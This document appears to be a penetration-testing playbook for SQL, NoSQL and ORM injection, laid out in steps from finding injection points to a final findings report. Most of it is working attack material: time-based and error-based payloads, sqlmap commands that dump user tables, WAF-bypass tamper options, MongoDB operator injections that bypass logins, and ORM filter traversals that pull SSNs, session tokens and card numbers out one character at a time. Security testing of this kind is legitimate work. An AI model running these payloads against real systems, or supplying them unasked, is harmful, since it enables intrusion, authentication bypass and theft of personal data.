# Playbook: SQL Injection Methodology

## Purpose
Systematically test for SQL injection across identified parameters.
Covers error-based, boolean-based blind, time-based blind, and UNION-based SQLi.
Input: endpoint + parameter list, or specific URL.

---

## Step 1 — Identify Injection Points

```bash
# From parameter_discovery output (already categorized)
cat params_sqli.txt  # id, user, search, query, order, filter, etc.

# From wayback output — endpoints with ID-type parameters
grep -iE "[?&](id|user|uid|search|q|query|cat|order|sort|filter|from|to|date|ref|page)=" \
  urls_all.txt | sort -u > sqli_candidates.txt
```

---

## Step 2 — Passive Detection (No Automation Yet)

Manually add a single quote to each parameter and observe:

```
https://TARGET/products?id=1'
https://TARGET/search?q=test'
https://TARGET/api/users?id=1'
```

**Indicators of potential SQLi:**
- `You have an error in your SQL syntax`
- `Warning: mysql_fetch_array()`
- `ORA-00933: SQL command not properly ended`
- `Microsoft OLE DB Provider for SQL Server`
- `Unclosed quotation mark after the character string`
- `SQLSTATE[42000]`
- `pg_query(): Query failed`
- HTTP 500 error where `id=1` returns 200

---

## Step 3 — Manual Confirmation Tests

### Boolean-based detection
```
# True condition — should return normal result
id=1 AND 1=1--
id=1 AND 1=1-- -
id=1' AND '1'='1

# False condition — should return empty/different result
id=1 AND 1=2--
id=1' AND '1'='2

# If results differ → boolean-based SQLi confirmed
```

### Time-based detection (blind)
```bash
# MySQL
curl -sk "https://TARGET/endpoint?id=1 AND SLEEP(5)--" -w "%{time_total}"
curl -sk "https://TARGET/endpoint?id=1' AND SLEEP(5)-- -" -w "%{time_total}"

# PostgreSQL
curl -sk "https://TARGET/endpoint?id=1;SELECT pg_sleep(5)--" -w "%{time_total}"

# MSSQL
curl -sk "https://TARGET/endpoint?id=1;WAITFOR DELAY '0:0:5'--" -w "%{time_total}"

# Oracle
curl -sk "https://TARGET/endpoint?id=1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(65)||CHR(65),5)--" -w "%{time_total}"

# If response takes ~5 seconds → time-based blind SQLi confirmed
```

### Error-based detection
```
id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--    # MySQL
id=1 AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--  # MSSQL
id=1 AND 1=1/0--  # generic
```

---

## Step 4 — DBMS Fingerprinting

Once SQLi is confirmed, identify the database:

```sql
-- MySQL
SELECT @@version
SELECT version()
SELECT @@datadir

-- PostgreSQL
SELECT version()
SELECT current_database()

-- MSSQL
SELECT @@version
SELECT @@servername
SELECT db_name()

-- Oracle
SELECT * FROM v$version WHERE ROWNUM=1
SELECT banner FROM v$version

-- SQLite
SELECT sqlite_version()
```

---

## Step 5 — Automated Exploitation with sqlmap

```bash
# Basic scan — GET parameter
sqlmap -u "https://TARGET/endpoint?id=1" \
  --batch \
  --level 3 \
  --risk 2 \
  --random-agent \
  --output-dir ./sqlmap_output/

# With authentication (cookie)
sqlmap -u "https://TARGET/endpoint?id=1" \
  --cookie="session=YOUR_COOKIE" \
  --batch \
  --level 3 \
  --risk 2

# POST request
sqlmap -u "https://TARGET/api/search" \
  --data="query=test&page=1" \
  --batch \
  --level 3 \
  --risk 2

# JSON body
sqlmap -u "https://TARGET/api/users" \
  --data='{"id": 1}' \
  --headers="Content-Type: application/json" \
  -p id \
  --batch

# From Burp request file
sqlmap -r burp_request.txt --batch --level 3 --risk 2

# Extract databases once SQLi confirmed
sqlmap -u "https://TARGET/endpoint?id=1" \
  --batch --dbs

# Extract tables from specific DB
sqlmap -u "https://TARGET/endpoint?id=1" \
  --batch -D database_name --tables

# Dump interesting table
sqlmap -u "https://TARGET/endpoint?id=1" \
  --batch -D database_name -T users --dump --stop 100
```

---

## Step 6 — WAF Bypass Techniques

If requests are being blocked:

```bash
# Tamper scripts for sqlmap
sqlmap -u "URL" --tamper=space2comment          # spaces → /**/
sqlmap -u "URL" --tamper=between                # > → BETWEEN
sqlmap -u "URL" --tamper=charencode             # URL encode chars
sqlmap -u "URL" --tamper=randomcase             # RaNdOm CaSe
sqlmap -u "URL" --tamper=base64encode           # base64 payload
sqlmap -u "URL" --tamper=space2comment,between,charencode  # combine

# Manual bypass patterns
# Space alternatives
/**/  %20  %09  %0a  %0d  +

# Comment alternatives
--    -- -    #    /**/    /*!*/

# Case mixing
SeLeCt  sElEcT  SELECT

# Double URL encoding
%2527  instead of %27 (quote)

# HTTP parameter pollution
?id=1&id=1 UNION SELECT--

# Delay via HTTP
# Use --delay=1 --safe-freq=3 in sqlmap to slow down
```

---

## Step 7 — Second-Order SQLi

Check for stored SQLi where input is stored and executed later:

```
1. Register with username: admin'-- 
2. Update profile with: ' OR 1=1--
3. Use functionality that queries using stored value
4. Observe if stored payload affects query result
```

---

## Step 8 — NoSQL Injection (MongoDB)

If tech-detect shows MongoDB or Node.js/Express:

```bash
# Boolean injection in JSON
curl -sk -X POST "https://TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

# Array injection
curl -sk -X POST "https://TARGET/api/users" \
  -H "Content-Type: application/json" \
  -d '{"username[$regex]": ".*", "password[$regex]": ".*"}'

# Parameter pollution (URL)
curl -sk "https://TARGET/api/users?username[$regex]=.*"
```

---

## Step 9 — ORM Leaking (PortSwigger Top 10 2025 #2)

Reference: "ORM Leaking More Than You Joined For" by Alex Brown.

ORMs expose structured query capabilities through search, filter, and sort
parameters. When these map directly to model fields and relations, attackers
can traverse relationships and extract data from tables they should never reach.
This is not classic SQLi — the queries are valid ORM calls, but the attacker
controls which fields and relations get queried.

### Generic ORM Data Extraction Methodology

```
1. Identify endpoints with filter/search/sort/order/include/fields parameters
2. Attempt to reference a known model field → confirm field-level access
3. Attempt to traverse a relation (e.g., user.profile, order.customer)
4. Use comparison operators (startswith, gt, lt, contains) to extract char-by-char
5. Enumerate field names by fuzzing common names (id, email, password, ssn, token)
6. Pivot across relations to reach sensitive tables (user → role → permissions)
```

### Django — ORM Filter Traversal

Django allows double-underscore relation traversal in querysets. If a view
passes user-controlled parameters to `.filter()`:

```python
# Vulnerable pattern in view code:
Model.objects.filter(**request.GET.dict())

# Attack: traverse relations to extract sensitive fields char by char
GET /api/users?profile__ssn__startswith=1        # 200 → first digit is 1
GET /api/users?profile__ssn__startswith=12       # 200 → second digit is 2
GET /api/users?profile__ssn__startswith=123      # 200 → continue...
GET /api/users?created_by__email__contains=@admin  # enumerate admin emails
GET /api/users?role__permissions__codename=superadmin  # find privileged users
```

Detection: look for `filter(**kwargs)` or `filter(**request.data)` patterns
in Django views and serializers.

### Rails ActiveRecord — includes/joins Manipulation

```ruby
# Vulnerable pattern:
User.includes(params[:include]).where(params[:filter])

# Attack: force eager loading of relations
GET /api/users?include=credit_cards&filter[credit_cards.number_start]=4
GET /api/users?include=sessions&filter[sessions.token_start]=eyJ
GET /api/users?joins=admin_roles&filter[admin_roles.level]=superadmin
```

Also check for `order` parameter injection:
```
GET /api/users?order=email       # normal
GET /api/users?order=password    # leaks ordering by password hash
```

### Hibernate / JPA — JPQL Injection via Criteria Queries

```java
// Vulnerable pattern:
String field = request.getParameter("sort");
query = em.createQuery("SELECT u FROM User u ORDER BY u." + field);

// Attack: inject JPQL expressions
GET /api/users?sort=password         # order by password hash
GET /api/users?sort=role.permissions  # traverse relation
GET /api/users?filter=1 AND u.role.name='ADMIN'  # JPQL boolean injection
```

Spring Data JPA `Specification` objects built from user input are also
vulnerable if field names are not whitelisted.

### Sequelize — Operator Injection (Node.js)

Sequelize accepts JSON operators in where clauses. If user input flows into
query objects without sanitization:

```bash
# Operator injection via JSON body
curl -X POST "https://TARGET/api/users" \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$regex": "^a"}}'

# Sequelize-specific operators
curl -X POST "https://TARGET/api/search" \
  -H "Content-Type: application/json" \
  -d '{"where": {"email": {"$like": "%@admin%"}}}'

# Nested relation access
curl -X POST "https://TARGET/api/orders" \
  -H "Content-Type: application/json" \
  -d '{"include": [{"model": "User", "where": {"role": "admin"}}]}'
```

Note: Sequelize v5+ disables string-based operators by default, but many
apps re-enable them or use the `Op` symbol equivalents unsafely.

### NoSQL ORM Injection (Mongoose)

Mongoose (MongoDB ODM for Node.js) is vulnerable when query parameters are
passed directly to find/findOne:

```bash
# Operator injection through query string
GET /api/users?username[$ne]=x&password[$ne]=x     # bypass auth
GET /api/users?token[$regex]=^eyJhbGciOi            # extract JWT prefix
GET /api/users?email[$regex]=^a&sort=email          # enumerate emails starting with 'a'
GET /api/users?role[$in][]=admin&role[$in][]=superadmin  # find privileged users

# Through JSON body
curl -X POST "https://TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$regex": "^p"}}'
```

### Detection Checklist

```
Parameters to target:
  filter, filters, where, query, search, q, sort, order, orderBy,
  sortBy, include, includes, fields, select, expand, populate,
  joins, relations, embed, nested, depth

Signals of ORM-backed filtering:
  - Double-underscore syntax in params (Django style)
  - Dot notation in filter keys (user.email, profile.ssn)
  - JSON operators in request body ($gt, $regex, $like, $ne)
  - Accepts 'include' or 'expand' parameter that changes response shape
  - Sort/order parameter that accepts arbitrary field names
  - Error messages mentioning model names, field names, or relation names
  - 200 vs 404/empty difference when guessing field names
```

### Exploitation Impact

- Full database content extraction through relation traversal
- Authentication bypass via operator injection
- Horizontal privilege escalation by filtering on role/permission fields
- PII extraction (SSN, credit card, etc.) through character-by-character brute force
- Typically rated HIGH to CRITICAL depending on data sensitivity

---

## Output

```
ENDPOINT      : GET /products?id=1
PARAMETER     : id
TYPE          : Error-based + Time-based blind
DBMS          : MySQL 8.0.27
TECHNIQUE     : UNION-based (4 columns)
CONFIRMED BY  : sqlmap — confirmed injection, extracted DB version
EXTRACTED     : users table (email, password_hash, role)
               - found admin hash: $2b$12$... (bcrypt)
SEVERITY      : CRITICAL
IMPACT        : Full database read, potential RCE via INTO OUTFILE
WAF           : None detected
NEXT STEP     : Load 03_reporting/report_writer.md
```
